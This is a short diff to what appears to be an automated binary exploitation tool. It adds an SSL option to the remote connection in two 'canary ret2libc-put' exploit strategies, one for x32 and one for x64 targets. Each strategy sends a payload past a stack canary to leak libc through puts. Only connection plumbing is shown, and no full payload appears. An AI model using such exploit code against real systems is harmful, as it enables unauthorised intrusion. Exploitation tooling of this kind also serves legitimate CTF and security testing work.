@@ -123,7 +123,7 @@ class CanaryRet2LibcPutX32RemoteStrategy(CanaryStrategy):
         print_section_header("EXPLOITATION: canary ret2libc-put - x32 Remote")
         print_payload("preparing remote canary + puts leak payload")
 
-        io = pwn_remote(host, port)
+        io = pwn_remote(host, port, ssl=ctx.ssl)  # v4.1.11
         io.recv()
         io.sendline(self.frame_after_canary(ctx, payload1))
 
@@ -254,7 +254,7 @@ class CanaryRet2LibcPutX64RemoteStrategy(CanaryStrategy):
         print_section_header("EXPLOITATION: canary ret2libc-put - x64 Remote")
         print_payload("preparing remote canary + puts leak payload (x64)")
 
-        io = pwn_remote(host, port)
+        io = pwn_remote(host, port, ssl=ctx.ssl)  # v4.1.11
         io.recv()
         io.sendline(self.frame_after_canary(ctx, payload1))
 
